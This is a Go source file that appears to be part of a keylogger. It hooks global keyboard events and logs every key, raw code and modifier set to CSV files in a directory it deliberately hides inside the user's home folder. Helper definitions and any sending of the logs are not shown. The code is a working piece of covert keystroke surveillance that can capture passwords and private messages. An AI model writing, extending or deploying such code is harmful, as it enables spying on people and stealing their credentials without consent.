package main

import (
	"encoding/csv"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"time"

	hook "github.com/robotn/gohook"
	hidden "github.com/tobychui/goHidden"
)

// Creates a hidden direcory at `path`
func createHiddenDirectory(path string) {
	// create the directory
	err := os.MkdirAll(path, os.ModePerm)
	if err != nil {
		log.Panicf("Error while creating output directory: %s", err.Error())
	}

	// hide the directory
	err = hidden.HideFile(path)
	if err != nil {
		log.Panicf("Error hiding the directory: %s", err.Error())
	}
}

// Returns `<current UNIX time in milliseconds>.csv`
func getNewCSVFileName() string {
	result := fmt.Sprintf("%d%s", time.Now().UnixMilli(), ".csv")
	return result
}

// Creates `csvFileName` in user's home directory under a specific folder and
// returns the file descriptor and CSV writer
func openNewCSVFile(csvFileName string) (*os.File, *csv.Writer) {
	userHome, err := os.UserHomeDir()
	if err != nil {
		log.Panicf("Error: %s", err.Error())
	}

	logDir := filepath.Join(userHome, APPLICATION_DIRECTORY)
	createHiddenDirectory(logDir)

	logFile := filepath.Join(logDir, csvFileName)
	// `os.O_APPEND|os.O_WRONLY|os.O_CREATE`: create file if not exists
	// otherwise, append to the already existing content
	file, err := os.OpenFile(logFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		log.Panicf("Error while opening file: %s", err.Error())
	}

	writer := csv.NewWriter(file)
	// write the headers if the file did not exist previously
	if stat, err := file.Stat(); err == nil && stat.Size() == 0 {
		writer.Write([]string{"key", "rawcode", "modifiers"})
	}

	return file, writer
}

// Writes event data to disk in CSV format using `writer`
func writeDataToDisk(event hook.Event, value string, writer *csv.Writer) {
	// get the modifiers for this event
	modifiers := getModifiers(event)
	modifiersList := strings.Join(modifiers, ", ")
	rawcode := fmt.Sprintf("%d", event.Rawcode)

	// attempt writing data to disk using `writer`
	err := writer.Write([]string{value, rawcode, modifiersList})
	if err != nil {
		log.Panicf("Error while writing to file: %s", err.Error())
	}

	// flush the `csv.Writer` buffer
	writer.Flush()
}
